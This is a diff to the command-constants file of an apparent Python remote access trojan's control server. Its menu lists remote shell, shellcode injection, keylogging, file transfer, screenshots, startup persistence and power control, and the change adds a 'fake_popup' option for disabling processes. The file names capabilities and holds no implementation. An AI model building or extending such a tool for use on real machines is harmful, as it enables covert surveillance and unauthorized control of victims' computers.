@@ -13,7 +13,6 @@ CLIENT_HANDSHAKE = 1
 # CLIENT_KEY = 2
 CLIENT_HEARTBEAT = 3
 CLIENT_EXIT = 4
-CLIENT_MSG = 5
 CLIENT_ADD_STARTUP = 6
 CLIENT_RMV_STARTUP = 7
 CLIENT_SCREENSHOT = 8
@@ -60,7 +59,6 @@ SERVER_MAIN_COMMAND_LIST = [{"arg": MENU_HELP, "info": "Help"},
                             {"arg": MENU_CLOSE_CONNECTION, "info": "Close connection", "arg2": "index"},
                             {"arg": MENU_CLOSE_ALL, "info": "Close/clear all connections"}]
 
-MENU_INTERACT_MSG = "M"
 MENU_INTERACT_RECV = "R"
 MENU_INTERACT_SEND = "S"
 MENU_INTERACT_SCRN = "P"
@@ -87,20 +85,22 @@ MENU_INTERACT_SHUT_SHUTDOWN = "shutdown"
 MENU_INTERACT_SHUT_RESTART = "restart"
 MENU_INTERACT_SHUT_LOCK = "lock"
 
+MENU_INTERACT_DISABLE_PROCESS_POPUP = "fake_popup"
+
 SERVER_INTERACT_COMMAND_LIST = [{"arg": MENU_HELP, "info": "Help"},
                                 {"arg": MENU_INTERACT_SHELL, "info": "Open remote shell"},
                                 {"arg": MENU_INTERACT_PYTHON, "info": "Open python interpreter"},
                                 {"arg": MENU_INTERACT_DISABLE_PROCESS, "info": "Toggle disable process",
-                                 "arg2": "process_name"}, {"arg": MENU_INTERACT_SHELLCODE, "info": "Inject shellcode"},
+                                 "arg2": "process_name", "optional_arg3": f"({MENU_INTERACT_DISABLE_PROCESS_POPUP})"},
+                                {"arg": MENU_INTERACT_SHELLCODE, "info": "Inject shellcode"},
                                 {"arg": MENU_INTERACT_KEYLOG, "info": "Keylogger",
                                  "arg2": f"({MENU_INTERACT_KEYLOG_START}) ({MENU_INTERACT_KEYLOG_STOP}) ({MENU_INTERACT_KEYLOG_DUMP})"},
-                                {"arg": MENU_INTERACT_MSG, "info": "Send message"},
                                 {"arg": MENU_INTERACT_RECV, "info": "Receive file"},
                                 {"arg": MENU_INTERACT_SEND, "info": "Send file"},
                                 {"arg": MENU_INTERACT_SCRN, "info": "Take screenshot"},
                                 {"arg": MENU_INTERACT_STARTUP, "info": "Add to startup",
                                  "arg2": f"({MENU_INTERACT_STARTUP_ADD}) ({MENU_INTERACT_STARTUP_RMV})"},
-                                {"arg": MENU_INTERACT_INFO, "info": "OS & user info"},
+                                {"arg": MENU_INTERACT_INFO, "info": "OS & connection info"},
                                 {"arg": MENU_INTERACT_SHUT, "info": "Power options",
                                  "arg2": f"({MENU_INTERACT_SHUT_SHUTDOWN}) ({MENU_INTERACT_SHUT_RESTART}) ({MENU_INTERACT_SHUT_LOCK})"},
                                 {"arg": MENU_INTERACT_BACKGROUND, "info": "Move connection to background"},
